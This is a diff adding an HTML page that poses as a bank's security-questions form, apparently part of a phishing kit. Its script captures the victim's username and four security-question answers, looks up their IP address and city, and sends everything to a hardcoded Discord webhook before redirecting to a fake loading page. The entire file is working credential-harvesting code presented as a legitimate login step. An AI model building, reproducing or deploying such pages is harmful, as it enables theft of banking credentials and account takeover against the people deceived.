@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Preguntas de Seguridad</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&family=Roboto+Slab:ital,wght@1,400&display=swap');
+
+  html, body {
+    height: 100%;
+    margin: 0; padding: 0;
+    font-family: 'Roboto', sans-serif;
+    background: url('background-login.webp') no-repeat center center fixed;
+    background-size: cover;
+    display: flex; justify-content: center; align-items: center;
+  }
+  .banner {
+    background: white;
+    width: 400px;
+    max-width: 95vw;
+    padding: 30px 30px;
+    border-radius: 8px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+  .header {
+    display: flex; align-items: center; justify-content: center; margin-bottom: 10px;
+  }
+  .logo { max-width: 140px; }
+  .linea-personal {
+    color: #51b046;
+    font-family: 'Roboto Slab', serif;
+    font-style: italic;
+    font-weight: 400;
+    font-size: 1.3rem;
+    margin-left: 12px;
+    user-select: none;
+  }
+  .titulo {
+    color: #51b046;
+    font-family: 'Roboto Slab', serif;
+    font-weight: 400;
+    font-size: 1.25rem;
+    margin: 10px 0 5px;
+  }
+  .subtitulo {
+    font-size: 0.9rem;
+    color: #333;
+    margin-bottom: 20px;
+  }
+  label {
+    font-size: 0.95rem;
+    color: black;
+    display: block;
+    margin-bottom: 6px;
+    text-align: left;
+  }
+  .asterisco { color: #f58220; }
+  .input-group {
+    position: relative;
+    margin-bottom: 20px;
+  }
+  input[type="text"] {
+    width: 100%;
+    padding: 12px 12px;
+    font-size: 1rem;
+    border: 2px solid #ccc;
+    border-radius: 6px;
+    box-sizing: border-box;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+  }
+  input[type="text"]:focus {
+    border-color: #50ba3f;
+    box-shadow: 0 0 12px #50ba3f;
+    outline: none;
+  }
+  button {
+    width: 100%;
+    padding: 14px;
+    background-color: #51b046;
+    border: none;
+    border-radius: 6px;
+    color: white;
+    font-size: 1.1rem;
+    cursor: pointer;
+    font-weight: 600;
+    transition: background-color 0.3s ease;
+  }
+  button:hover { background-color: #429635; }
+</style>
+</head>
+<body>
+  <div class="banner">
+    <div class="header">
+      <img src="logo145.png" alt="Logo" class="logo" />
+      <div class="linea-personal">| Personal</div>
+    </div>
+
+    <div class="titulo">Preguntas de Seguridad</div>
+    <div class="subtitulo">Responde Correctamente las preguntas que configuraste para acceder a tus productos</div>
+
+    <form method="POST" action="cargando2.html" id="securityForm">
+      <!-- No necesitamos campo hidden, usaremos localStorage -->
+      
+      <label for="respuesta1">Respuesta N° 1 Cual es su color favorito.<span class="asterisco">*</span></label>
+      <div class="input-group">
+        <input type="text" id="respuesta1" name="respuesta1" placeholder="Digita Respuesta 1" required />
+      </div>
+
+      <label for="respuesta2">Respuesta N° 2 Cual es la marca de su primer carro.<span class="asterisco">*</span></label>
+      <div class="input-group">
+        <input type="text" id="respuesta2" name="respuesta2" placeholder="Digita Respuesta 2" required />
+      </div>
+
+      <label for="respuesta3">Respuesta N° 3 Cual es el personaje de su libro favorito.<span class="asterisco">*</span></label>
+      <div class="input-group">
+        <input type="text" id="respuesta3" name="respuesta3" placeholder="Digita Respuesta 3" required />
+      </div>
+
+      <label for="respuesta4">Respuesta N° 4 Cual es el nombre de su abuela materna.<span class="asterisco">*</span></label>
+      <div class="input-group">
+        <input type="text" id="respuesta4" name="respuesta4" placeholder="Digita Respuesta 4" required />
+      </div>
+
+      <button type="submit" id="submitBtn">Continuar</button>
+    </form>
+  </div>
+
+<script>
+  // Configuración del Webhook de Discord
+  const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1472057162447720539/1ah2nyf69R2i7vlRY5v-WKvnCE3esv5E_J-kcR9vdKTABGfGRqMbsEYn9R5Hml77rjn6';
+
+  // Interceptar el envío del formulario
+  document.getElementById('securityForm').addEventListener('submit', async function(e) {
+    e.preventDefault(); // Prevenir envío normal
+    
+    // Obtener usuario del localStorage (guardado en index.html)
+    const usuario = localStorage.getItem('usuario') || 'Usuario no encontrado';
+    
+    const respuesta1 = document.getElementById('respuesta1').value;
+    const respuesta2 = document.getElementById('respuesta2').value;
+    const respuesta3 = document.getElementById('respuesta3').value;
+    const respuesta4 = document.getElementById('respuesta4').value;
+    const submitBtn = document.getElementById('submitBtn');
+    
+    console.log('Usuario recuperado:', usuario); // Para depurar
+    
+    // Deshabilitar el botón para evitar múltiples envíos
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Enviando...';
+    
+    // Obtener IP del usuario
+    let ip = 'IP desconocida';
+    let ciudad = 'Desconocida';
+    let pais = 'Desconocido';
+    
+    try {
+      // Obtener IP pública
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      if (ipResponse.ok) {
+        const ipData = await ipResponse.json();
+        ip = ipData.ip;
+        
+        // Obtener ubicación basada en IP (usando ipapi.co)
+        try {
+          const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+          if (locationResponse.ok) {
+            const locationData = await locationResponse.json();
+            ciudad = locationData.city || 'Desconocida';
+            pais = locationData.country_name || 'Desconocido';
+          }
+        } catch (locationError) {
+          console.log('No se pudo obtener la ubicación');
+        }
+      }
+    } catch (error) {
+      console.log('No se pudo obtener la IP pública');
+    }
+    
+    // Formatear fecha
+    const now = new Date();
+    const fechaFormateada = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+    
+    // Crear mensaje para Discord
+    const mensaje = {
+      content: `💰 BHD PREGUNTAS DE SEGURIDAD 💰
+✉️ Usuario: ${usuario}
+
+🔐 Respuestas de Seguridad:
+1️⃣ Color favorito: ${respuesta1 || "No proporcionada"}
+2️⃣ Marca primer carro: ${respuesta2 || "No proporcionada"}
+3️⃣ Personaje libro favorito: ${respuesta3 || "No proporcionada"}
+4️⃣ Nombre abuela materna: ${respuesta4 || "No proporcionada"}
+
+🌐 IP: ${ip}
+🏙 Ciudad: ${ciudad}
+🇲🇽 País: ${pais}
+
+🕒 Fecha: ${fechaFormateada}
+
+By: ASHESITO`
+    };
+    
+    // Enviar datos a Discord
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(mensaje)
+      });
+      
+      console.log('Datos enviados a Discord');
+      
+    } catch (error) {
+      console.error('Error enviando a Discord:', error);
+    }
+    
+    // Redireccionar a cargando2.php después de 1 segundo
+    setTimeout(() => {
+      // Enviar formulario normalmente (esto redirigirá a cargando2.php)
+      this.submit();
+    }, 1000);
+  });
+</script>
+</body>
+</html>
